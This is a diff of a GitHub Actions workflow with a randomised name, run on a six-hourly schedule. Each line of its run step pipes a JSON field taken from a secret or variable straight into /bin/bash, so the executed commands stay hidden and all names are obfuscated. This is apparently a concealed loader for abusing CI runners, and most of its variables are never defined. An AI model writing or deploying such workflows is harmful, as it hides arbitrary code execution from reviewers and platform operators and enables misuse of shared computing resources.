@@ -1,9 +1,8 @@
 name: yuanjieling2038
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '18 1/6 * * *'
+    - cron: '57 2/6 * * *'
 
 jobs:
   build:
@@ -12,17 +11,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: yuanjieling2038
         env:
-          eon9876: ${{ secrets.eon9876 }}
+          gdwfs3: ${{ secrets.gdwfs3 }}
         run: |
-          echo $eon9876 | jq -r .etj37 | /bin/bash
-          echo $ca9301 | jq -r .opbg78702 | /bin/bash
-          echo $lwbc42829 | jq -r .ycdbw732 | /bin/bash
-          echo $yikpe03375 | jq -r .upnrw3 | /bin/bash
-          echo $delu9 | jq -r .wmc774 | /bin/bash
-          echo $gc35469 | jq -r .ggow072 | /bin/bash
-          echo $rpu82285 | jq -r .zyfju3088 | /bin/bash
-          echo $wbbyf20414 | jq -r .mpe672 | /bin/bash
-          echo $tgcuz0 | jq -r .hot407 | /bin/bash
-          echo $gr141 | jq -r .bebj7165 | /bin/bash
-          echo $gnv4 | jq -r .wtjel864 | /bin/bash
+          echo $gdwfs3 | jq -r .gjker2053 | /bin/bash
+          echo $z0625 | jq -r .omc9729 | /bin/bash
+          echo $dp0329 | jq -r .upjb0 | /bin/bash
+          echo $kt7314 | jq -r .ld3 | /bin/bash
+          echo $jkblu2 | jq -r .q5 | /bin/bash
+          echo $bou0 | jq -r .gbq743 | /bin/bash
+          echo $jo144 | jq -r .fr172 | /bin/bash
+          echo $vcx42945 | jq -r .ae8230 | /bin/bash
+          echo $btpqn16759 | jq -r .xjp1 | /bin/bash
 
